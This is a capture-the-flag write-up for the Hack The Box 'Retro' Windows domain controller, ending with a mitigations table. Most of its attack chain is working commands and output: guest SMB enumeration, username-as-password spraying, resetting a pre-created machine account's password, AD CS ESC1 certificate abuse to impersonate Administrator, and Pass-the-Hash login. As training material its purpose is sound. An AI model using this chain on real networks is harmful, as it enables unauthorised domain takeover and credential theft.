# Retro — Hack The Box

| | |
|---|---|
| **Platform** | Hack The Box (VulnLab) |
| **OS** | Windows |
| **Difficulty** | Easy |
| **IP** | `10.129.234.44` |
| **Domain / Host** | `retro.vl` / `DC.retro.vl` |
| **Author** | r0BIT |

## Synopsis

Retro is an easy Windows machine built around an **Active Directory Domain Controller**.
Anonymous **SMB (Guest)** access exposes shares that hint at a **shared, weak trainee
password** (`trainee:trainee`), which yields the user flag. A **pre-created machine account**
(`BANKING$`) still holds its default password (its own name in lowercase) and can be
re-provisioned. As a member of **Domain Computers**, that account can abuse **AD CS ESC1** on
the `RetroClients` template to request a certificate impersonating the **Administrator**,
recover its NT hash, and log in via **Pass-the-Hash** for full domain compromise.

**Skills required:** basic Active Directory enumeration
**Skills learned:** enumeration with NetExec, pre-created machine account abuse, AD CS ESC1 with Certipy

---

## Attack chain

```
Guest (anonymous SMB)
   └─ shares + RID brute
trainee:trainee (weak shared password)
   └─ Notes share → user flag + hint about the old machine account
BANKING$ (pre-created machine account, password = "banking")
   └─ password reset → valid login → member of Domain Computers
AD CS ESC1 (template RetroClients)
   └─ certificate as Administrator → NT hash
Pass-the-Hash (Evil-WinRM)
   └─ retro\administrator → root flag
```

---

## Enumeration

### Nmap

Fast open-port scan, then a targeted service/script scan on those ports:

```bash
ports=$(nmap --open 10.129.234.44 | grep open | cut -d ' ' -f 1 | cut -d '/' -f 1 | paste -sd,)
nmap 10.129.234.44 -p $ports -sV -sC -Pn --disable-arp-ping
```

A classic Domain Controller footprint:

| Port | Service |
|------|---------|
| 53 | DNS (Simple DNS Plus) |
| 88 / 464 | Kerberos / kpasswd |
| 135 / 139 / 445 | RPC / NetBIOS / SMB |
| 389 / 636 / 3268 / 3269 | LDAP / LDAPS / Global Catalog |
| 593 | RPC-over-HTTP |
| 3389 | RDP |
| 5985 | WinRM |

The TLS certificate reveals the CN `DC.retro.vl`. Add it to `/etc/hosts`:

```bash
echo "10.129.234.44 retro.vl dc.retro.vl" | sudo tee -a /etc/hosts
```

### SMB with Guest

Anonymous Guest logon (no password) is allowed:

```bash
nxc smb retro.vl -u "Guest" -p ""
nxc smb retro.vl -u "Guest" -p "" --shares
```

Two **non-default** shares stand out: `Notes` and `Trainees` (the latter is `READ`able).

```bash
smbclient //retro.vl/Trainees -U 'Guest'
smb: \> get Important.txt
```

`Important.txt` explains that the admins bundled all trainees into **one shared account** with
an easy-to-remember password — a strong hint towards a **weak credential**.

### RID brute force

```bash
nxc smb retro.vl -u "Guest" -p "" --rid-brute
```

Non-default objects:

```
1104: RETRO\trainee   (User)
1106: RETRO\BANKING$  (User — the trailing $ marks a MACHINE account)
1107: RETRO\jburley   (User)
1108: RETRO\HelpDesk  (Group)
1109: RETRO\tblack    (User)
```

---

## Foothold — trainee:trainee

Test whether any account uses its username as its password:

```bash
# users.txt: one name per line (trainee, jburley, tblack, ...)
nxc smb retro.vl -u users.txt -p users.txt --continue-on-success
# [+] retro.vl\trainee:trainee
```

With `trainee:trainee`, read the `Notes` share:

```bash
smbclient //retro.vl/Notes -U 'trainee%trainee'
smb: \> get user.txt
smb: \> get ToDo.txt
```

- `user.txt` → **user flag**.
- `ToDo.txt` → a note about cleaning up the **old pre-created computer account** from the
  finance department — i.e. `BANKING$`.

---

## Privilege escalation

### Pre-created machine account (BANKING$)

When a machine account is created with **"Assign this computer account as a pre-Windows 2000
computer"**, its initial password is the **account name in lowercase** (`banking`). If the
machine has **never authenticated** to the domain, that password can still be changed by us.

Confirm the default password:

```bash
smbclient //retro.vl/Notes -U 'BANKING$%banking'
# session setup failed: NT_STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
```

`NOLOGON_WORKSTATION_TRUST_ACCOUNT` (rather than `LOGON_FAILURE`) confirms the password
`banking` is **correct** — it just can't be used for a normal logon until it's reset.

Reset the password. The official write-up uses Impacket's `changepasswd.py`; on Kali with
Impacket installed via `apt`, the scripts are prefixed with `impacket-`:

```bash
# Kali (apt Impacket):
impacket-changepasswd retro.vl/'banking$':banking@10.129.234.44 -newpass 'user' -p rpc-samr
# [*] Password was changed successfully.
```

> No Impacket? `rpcclient` with `chgpasswd2` (SAMR) works too.

Validate the new credential:

```bash
nxc ldap 10.129.234.44 -u 'banking$' -p 'user'
# [+] retro.vl\banking$:user
```

### AD CS enumeration

`BANKING$` is a member of **Domain Computers**. Check for AD CS:

```bash
nxc ldap retro.vl -u "banking$" -p 'user' -M adcs
# Found PKI Enrollment Server: DC.retro.vl
# Found CN: retro-DC-CA
```

Enumerate vulnerable templates with Certipy:

```bash
certipy-ad find -u 'banking$' -p 'user' -dc-ip 10.129.234.44 -vulnerable -stdout
```

**ESC1** on the `RetroClients` template:

```
Template Name          : RetroClients
Minimum RSA Key Length : 4096
Enrollment Rights      : RETRO.VL\Domain Admins
                         RETRO.VL\Domain Computers   <-- BANKING$ is here
                         RETRO.VL\Enterprise Admins
[!] Vulnerabilities
  ESC1 : 'Domain Computers' can enroll, enrollee supplies subject
         and template allows client authentication
```

**Why it's exploitable (ESC1):** the enrollee supplies the *Subject/UPN*, the template allows
*Client Authentication*, and a group we belong to (`Domain Computers`) can enroll. We can
therefore request a certificate **in the name of Administrator**.

### ESC1 exploitation

Request the certificate as Administrator:

```bash
certipy-ad req -u 'banking$' -p 'user' -dc-ip 10.129.234.44 \
  -ca retro-DC-CA -template RetroClients \
  -upn administrator -key-size 4096 -target dc.retro.vl
```

> **Gotcha 1 — network timeout.** The first attempt failed with `NETBIOS connection timed
> out` (HTB VPN instability). Simply re-running the command resolved it.

> **Gotcha 2 — `Object SID mismatch`.** Since **KB5014754**, Windows Server 2022 validates the
> **SID embedded in the certificate** against the real user SID. Recover the domain SID and
> rebuild the Administrator SID (RID **500**), then re-request with `-sid`:
>
> ```bash
> impacket-lookupsid retro.vl/'banking$':'user'@10.129.234.44
> # Domain SID: S-1-5-21-2983547755-698260136-4283918172
>
> certipy-ad req -u 'banking$' -p 'user' -dc-ip 10.129.234.44 \
>   -ca retro-DC-CA -template RetroClients \
>   -upn administrator -key-size 4096 -target dc.retro.vl \
>   -sid S-1-5-21-2983547755-698260136-4283918172-500
> # [*] Saved certificate and private key to 'administrator.pfx'
> ```

> **Gotcha 3 — `KDC_ERR_PADATA_TYPE_NOSUPP` (PKINIT).** If authentication returns a PKINIT
> padata error:
> 1. Fix clock skew (Kerberos rejects >5 min drift): `sudo ntpdate retro.vl`
>    (`KRB_AP_ERR_SKEW` points to the same cause).
> 2. Note: in Certipy 5.1.0 the `-dc-host` flag does **not** exist on the `auth` subcommand.
> 3. Fallback that bypasses PKINIT entirely — authenticate over **Schannel/LDAP** and reset
>    the Administrator password directly:
>    ```bash
>    certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.234.44 -ldap-shell
>    # LDAP shell:  set_password administrator NewPass123!
>    ```

Authenticate with the certificate to recover the NT hash (PKINIT path, once resolved):

```bash
certipy-ad auth -pfx 'administrator.pfx' -username 'administrator' \
  -domain 'retro.vl' -dc-ip 10.129.234.44
# [*] Got hash for 'administrator@retro.vl':
#     aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389
```

### Pass-the-Hash → root

```bash
evil-winrm -u Administrator -H 252fac7066d93dd009d4fd2cd0368389 -i retro.vl
*Evil-WinRM* PS> whoami
# retro\administrator
```

**Root flag:** `C:\Users\Administrator\Desktop\root.txt`.

---

## Mitigations

| Weakness | Mitigation |
|---|---|
| Anonymous SMB / enumeration (Guest) | Disable the Guest account; restrict null/guest sessions and RID cycling |
| Shared / weak password (`trainee`) | Enforce strong, unique passwords + MFA; audit shared accounts |
| Pre-created machine account (`BANKING$`) | Remove unused pre-created accounts; never leave password = name; rotate secrets |
| AD CS **ESC1** (`RetroClients`) | Remove "enrollee supplies subject", limit enrollment rights, require Manager approval; enforce KB5014754 |
| Pass-the-Hash | Tier model / Protected Users; LAPS; rotate the Administrator account |

## Appendix — error cheat sheet

| Error | Meaning | Action |
|---|---|---|
| `NT_STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` | Password correct, but machine account needs a reset | `impacket-changepasswd … -p rpc-samr` |
| `changepasswd.py: not found` | apt Impacket uses the `impacket-` prefix | `impacket-changepasswd …` |
| `NETBIOS connection timed out` | VPN instability | Re-run the command |
| `Object SID mismatch` | KB5014754 validates the cert SID | Re-request with `-sid <domain>-500` |
| `KDC_ERR_PADATA_TYPE_NOSUPP` | PKINIT (skew / negotiation) | `ntpdate retro.vl`; or `-ldap-shell` (Schannel) |
| `KRB_AP_ERR_SKEW` | Clock out of sync | `sudo ntpdate retro.vl` |
